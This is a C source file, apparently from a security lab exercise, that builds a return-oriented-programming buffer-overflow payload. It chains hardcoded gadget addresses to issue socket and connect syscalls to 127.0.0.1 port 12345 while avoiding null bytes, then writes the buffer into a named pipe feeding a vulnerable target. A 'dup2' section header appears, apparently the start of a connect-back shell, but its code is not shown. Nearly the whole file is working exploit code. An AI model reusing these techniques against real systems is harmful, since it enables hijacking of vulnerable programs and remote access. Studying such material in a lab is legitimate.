#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"


int main(void)
{
  char bufr[400]; // address = 0xbfbf671d

  char trap[] = "\xe5\xb6\xa9\xbb";

  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";

  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
  char xor_edx[] = "\xd4\xbe\xb3\xbb";

  char and_eax_edx[] = "\x8a\xe9\xb3\xbb";

  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char add_cl_ah[] = "\xd7\xbd\xa7\xbb";
  
  char inc_edx[] = "\x8a\xb8\xb7\xbb";

  char dec_ecx[] = "\x17\xe7\xb7\xbb";

  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb";
  char write_at_edx_from_eax[] = "\x79\x2d\xb5\xbb";

  char jump_12[] = "\x68\x8b\xaa\xbb";
  char jump_16[] = "\x2a\x01\xad\xbb";

  char dummy_ret[] = "\x9c\x36\xa7\xbb";

  // _socket30 syscall
  char socket_arg1[] = "\x8a\x01\x01\x01";
  char socket_arg2[] = "\x01\x01\x01\x01";

  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2, bufr + 231
  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1, bufr + 235
  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239

  // connect syscall
  char con_arg[] = "\x62\x01\x01\x01";

  char con_arg_3_addr[] = "\x90\x68\xbf\xbf"; // bufr + 371
  
  char con_arg_ip[] = "\x7f\x01\x01\x01";
  char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
  char con_arg_ip_addr[] = "\x2c\x68\xbf\xbf"; // bufr + 271

  // bufr + 267
  // info.filler = "\x01"
  // info.af_inent = "\x02"
  // info.port_num = "\x39\x30"
  // bufr + 271
  // info.ip_addr = "\x01\x01\x01\x01" filler value, should be 0x0100007f before syscall
  // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"

  char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
  char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267

  char con_arg_16_seed[] = "\x01\x01\x01\xf0";
  char con_arg_16_addr[] = "\x98\x68\xbf\xbf"; // bufr + 379

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);
  //----------------------------------------------------------------------------------------- _socket30
  // get first 8 bits of socket arg-> 8a
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, socket_arg1);
  // get next 8 bits of socket arg-> 01
  strcpy(bufr + 139, pop_ecx); // 0xbbaa422
  strcpy(bufr + 143, socket_arg2);
  // clear eax
  strcpy(bufr + 147, xor_eax); // 0xbba9b3c2
  // add first 8 bits of arg
  strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
  // add next 8 bits of arg
  strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
                                 // eax now holds 394-> 18a
  // prepare stack with 3 args for socket syscall
  // clear edx
  strcpy(bufr + 159, xor_edx); // 0xbbb3bed4
  // increment ecx to 2
  strcpy(bufr + 163, inc_edx); // 0xbbb7b88a
  strcpy(bufr + 167, inc_edx); // 0xbbb7b88a
  // pop first address of args -> 2
  strcpy(bufr + 171, pop_ecx); // 0xbbaa422 dec_ecx
  strcpy(bufr + 175, socket_stack_arg1_address); // -> 0xbfbf6804
  // dummy gadget to avoid null character in address
  strcpy(bufr + 179, dummy_ret);
  strcpy(bufr + 183, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 187, xor_edx); // 0xbbb3bed4
  // increment edx to 1
  strcpy(bufr + 191, inc_edx); // 0xbbb7b88a
  // pop second address of args -> 1
  strcpy(bufr + 195, pop_ecx); // 0xbbaa422
  strcpy(bufr + 199, socket_stack_arg2_address); // -> 0xbfbf6808
  strcpy(bufr + 203, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 207, xor_edx); // 0xbbb3bed4
  // pop third address of args -> 0
  strcpy(bufr + 211, pop_ecx); // 0xbbaa422
  strcpy(bufr + 215, socket_stack_arg3_address); // -> 0xbfbf680c
  strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e

  // trap into the kernel for _socket30 syscall
  strcpy(bufr + 223, trap);  // 0xbba9b6e5, location is 0xbfbf67fc
  // jump 12 bytes to next gadget
  strcpy(bufr + 227, jump_12); // 0xbbaa8b68
  // socket arg 1 -> 2
  strcpy(bufr + 231, "\x01\x01\x01\x01");
  // socket arg 2 -> 1
  strcpy(bufr + 235, "\x01\x01\x01\x01");
  // socket arg 3 -> 0
  strcpy(bufr + 239, "\x01\x01\x01\x01");
  //----------------------------------------------------------------------------------------- connect
  // pop ip_address without null chars into edx
  strcpy(bufr + 243, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 247, con_arg_ip);
  // pop mask into eax
  strcpy(bufr + 251, pop_eax); // 0xbbb9a0e1
  strcpy(bufr + 255, con_arg_ip_mask); 
  // AND ecx and eax to get ip address
  strcpy(bufr + 259, and_eax_edx); // 0xbbb3e98a
                                  // eax should have 0x0100007f
  // store socket struct and jump over it
  strcpy(bufr + 263, jump_16); // 0xbbad012a
  strcpy(bufr + 267, sockaddr_in);
  // pop ip address addr into edx
  strcpy(bufr + 283, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 287, con_arg_ip_addr);
  // write eax to where edx points
  strcpy(bufr + 291, write_at_edx_from_eax); // 0xbbb52d79
                                            // 0xbfbf6828 should store 0x0100007f, sockaddr_in struct finished
  // use inc to get 0x3 into edx
  // clear edx and inc to 3
  strcpy(bufr + 295, xor_edx); // 0xbbb3bed4
  strcpy(bufr + 299, inc_edx); // 0xbbb7b88a
  strcpy(bufr + 303, inc_edx); // 0xbbb7b88a
  strcpy(bufr + 307, inc_edx); // 0xbbb7b88a
  // pop 3 arg address into ecx 
  strcpy(bufr + 311, pop_ecx); // 0xbbaa422
  strcpy(bufr + 315, con_arg_3_addr);
  // write value of 3 to where ecx points to
  strcpy(bufr + 319, write_at_ecx_from_edx); // 0xbbb6b87e
                                            // 0x should have 0x3
  // use seed to put 0xf0 into eax
  // pop seed into edx
  strcpy(bufr + 323, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 327, con_arg_16_seed);
  // clear eax
  strcpy(bufr + 331, xor_eax); // 0xbba9b3c2
  // add last 8 bits of edx to 
  strcpy(bufr + 335, add_dl_al); // 0xbbbb4607
  // pop 16 arg address into edx
  strcpy(bufr + 339, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 343, con_arg_16_addr);
  // write eax to where edx is pointing
  strcpy(bufr + 347, write_at_edx_from_eax); // 0xbbb52d79
                                            // 0x should have 0xf0
  // move 98 into eax                                            
  // clear eax
  strcpy(bufr + 351, xor_eax); // 0xbba9b3c2
  // pop connect arg into edx
  strcpy(bufr + 355, pop_edx); // 0xbbb9dc1b
  // add first 8 bits of edx to eax
  strcpy(bufr + 359, add_dl_al); // 0xbbbb4607
                                // eax should have 0x62
  // trap into connect syscall
  strcpy(bufr + 363, trap);  // 0xbba9b6e5, location is 0xbfbf6868
  // jump 12 bytes
  strcpy(bufr + 367, jump_12);
  // hardcoded file descriptor
  strcpy(bufr + 371, "\x01\x01\x01\x01");
  // store address of socketaddr_in struct
  strcpy(bufr + 375, sockaddr_in_addr);
  // 4 byte value 16
  strcpy(bufr + 379, "\x01\x01\x01\x01");
  //----------------------------------------------------------------------------------------- dup2 #1
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
